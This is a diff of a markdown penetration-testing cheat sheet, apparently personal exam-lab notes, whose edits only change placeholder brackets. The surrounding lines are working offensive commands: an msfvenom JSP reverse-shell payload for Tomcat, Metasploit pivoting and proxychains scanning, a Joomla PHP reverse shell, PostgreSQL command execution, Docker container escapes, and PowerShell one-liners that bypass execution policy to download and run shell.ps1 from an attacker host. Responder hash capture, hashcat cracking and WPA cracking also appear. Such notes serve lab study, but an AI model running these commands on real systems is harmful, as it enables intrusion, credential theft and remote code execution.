@@ -182,23 +182,23 @@ F
 > 1. ``` reset ```
 > 1. ``` export SHELL=bash ```
 > 1. ``` export TERM=xterm-256color ```
-> 1. ``` stty rows <num> columns <cols>; e.g stty rows 29 columns 103 stty rows 34 columns 134```
+> 1. ``` stty rows 29 columns 103 ; stty rows 34 columns 134 ```
 
 #### Pivoting crap - MSF, socks4a and proxychains
 > 1. ``` use msf exploit/multi/handler ```
 > 1. get session as reverse shell
 > 1. upgrade the session to meterpreter by running command --> ``` sessions -u 1 ```
-> 1. go to upgraded meterpreter session and type the autoroute command ---> ``` run autoroute -s <the network you want to access> ```
+> 1. go to upgraded meterpreter session and type the autoroute command ---> ``` run autoroute -s (the network you want to access) ```
 > 1. to see if the new network is accessible, run **ping sweep* by typing command --->  ``` use -> multi/gather/ping_sweep ```. use new network and meterpreter session number.
 > 1. to set up socks4a server ---> ```use auxiliary/server/socks4a```
 > 1. edit proxychains.conf, add ***sock4a*** proxy with 127.0.0.1 and port 1080.
-> 1. next run proxychains with sudo before nmap. remember proxychains can only get TCP/UDP no ICMP, so use nmap something like ```sudo proxychains nmap -sT -sC -sV -r -v -Pn <IP> ```
+> 1. next run proxychains with sudo before nmap. remember proxychains can only get TCP/UDP no ICMP, so use nmap something like ```sudo proxychains nmap -sT -sC -sV -r -v -Pn (IP) ```
 	
 > 1. **In Attacker console**
 > 1. ``` stty size ``` (to find ROWS and COLUMNS value)
 
 #### Setting up PHP server
-> 1. To execute a PHP script file, in command line simply type -> php <file name.php>
+> 1. To execute a PHP script file, in command line simply type -> php (file name.php)
 > 1. to start a php based webserver, simply type -> php -S localhost:8000
  
 #### Tomcat 8080 bruteforcing the Authentication
@@ -208,7 +208,7 @@ F
 > 1. Deploy this payload to tomcat and get reverse shell ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.10.100 LPORT=8080 -f war -o myrev.war```
 	
 #### postgres - psql 
-> 1. ```bash psql -h 192.168.250.47 -p 5437 -U <username>  -W```
+> 1. ```bash psql -h 192.168.250.47 -p 5437 -U (username) -W```
 > 1. Default username password can be postgres:postgres
 > 1. Get exact version ```bash SELECT version();```
 > 1. For command execution (Tested on PostgreSQL 11.7 (Debian 11.7-0+deb10u1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 8.3.0-6) 8.3.0, 64-bit) :
@@ -285,7 +285,7 @@ Connection: close
 ```
 	
 #### FTP download
-> 1. ncftpget -R -T -v -P <FTP Port> -u 'anonymous' -p '12345' 192.168.248.127 /var/tmp/001_PGP/medjed/ app
+> 1. ncftpget -R -T -v -P (FTP Port) -u 'anonymous' -p '12345' 192.168.248.127 /var/tmp/001_PGP/medjed/ app
 > 1. wget -r ftp://anonymous@192.168.237.127:30021
 
 #### XXE injection
@@ -366,7 +366,7 @@ xmlns:urn=\"urn:muddy\"><soapenv:Header/>
 > 1. ```aircrack-ng -w /usr/share/wordlists/rockyou.txt WPA-01.cap1```
 	
 #### Joomla Reverse Shell
-> 1. Go to extensions ---> templates ---> protostar, create new file, rev with extension .php, upload REVERSE SHELL php, acces it via http://<IP>/joomla/rev.php 
+> 1. Go to extensions ---> templates ---> protostar, create new file, rev with extension .php, upload REVERSE SHELL php, acces it via http://(IP)/joomla/rev.php 
 > 1. https://vk9-sec.com/reverse-shell-on-any-cms/
 
 #### Docker breakout container
@@ -376,7 +376,7 @@ xmlns:urn=\"urn:muddy\"><soapenv:Header/>
 	
 #### Docker goinside a container
 >1. First check what docker containers are running by runnig ```docker ps```. 
->1. To go inside a container, run ```bash docker exec -it -u 0 <container id> /bin/sh``` or ```bash docker exec -it -u 0 <container id> /bin/bash```
+>1. To go inside a container, run ```bash docker exec -it -u 0 (container id) /bin/sh``` or ```bash docker exec -it -u 0 (container id) /bin/bash```
 
 ### Jenkins reverse shell - Linux
 ```bash
@@ -424,7 +424,7 @@ or
 > 1. powershell.exe -a '-NoP -NonI -W Hidden -Exec Bypass -Command dir'
 > 1. powershell.exe -a '-NoP -NonI -W Hidden -Exec Bypass -Command ipconfig'
 > 1. powershell.exe -a '-NoP -NonI -W Hidden -Exec Bypass -Command systeminfo'
-> 1. powershell.exe -a '-NoP -NonI -W Hidden -Exec Bypass -e <grab encoded payload from revshells.com>'
+> 1. powershell.exe -a '-NoP -NonI -W Hidden -Exec Bypass -e (grab encoded payload from revshells.com)'
 > 1. powershell -exec bypass -c iex(new-object net.webclient).downloadstring('http://KaliIP/shell.ps1')
 > 1. powershell -exec bypass -c "IEX(IWR http://KaliIP/shell.ps1 -UserBasicParsging)"
 > 1. where shell.ps1 is:
@@ -483,7 +483,7 @@ or
 > 1. Look for exploits on -> https://github.com/SecWiki/windows-kernel-exploits
 > 1. find OS details - ```systeminfo | findstr /B /C:"OS Name" /C:"OS Version"```
 > 1. total users present - ```net users```
-> 1. specific user details - ```net user <username>```
+> 1. specific user details - ```net user (username)```
 > 1. FW status - ```netsh firewall show state```
 > 1. PrivESC Script https://github.com/itm4n/PrivescCheck
 > 1. PrintSpoofer -> https://github.com/itm4n/PrintSpoofer
@@ -531,7 +531,7 @@ trator```
 > 1. On Kali Linux ```responder -I eth0 -rdwv```
 > 1. On Victim Machine give ```\\<KALI-LINUX IP```
 > 1. Now, note down the hashes capured on Kali
-> 1. Use hashid to identify the hash algo ```hashid -m '<HASH VALUE>'```
+> 1. Use hashid to identify the hash algo ```hashid -m '(HASH VALUE)'```
 > 1. Answer can be ```[+] NetNTLMv2 [Hashcat Mode: 5600]```
 > 1. Crack it via HASHCAT ```hashcat.exe -a 0 -m 5600 005_fcastleLLNMR.txt 000_dict_rockyou.txt```
 					    
@@ -583,7 +583,7 @@ trator```
   ListenAddress 0.0.0.0
   ```
 > 1. restart ssh service
-> 1. netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=2222 connectaddress=<Windows or WSL IP here> connectport=2222 [ portfwd]
+> 1. netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=2222 connectaddress=(Windows or WSL IP here) connectport=2222 [ portfwd]
 > 1. netsh advfirewall firewall add rule name=”Open Port 2222 for WSL2” dir=in action=allow protocol=TCP localport=2222 [ firewall]
 > 1. netsh interface portproxy show v4tov4 [ to show the entries added]
 > 1. netsh int portproxy reset all [ reset everything ]
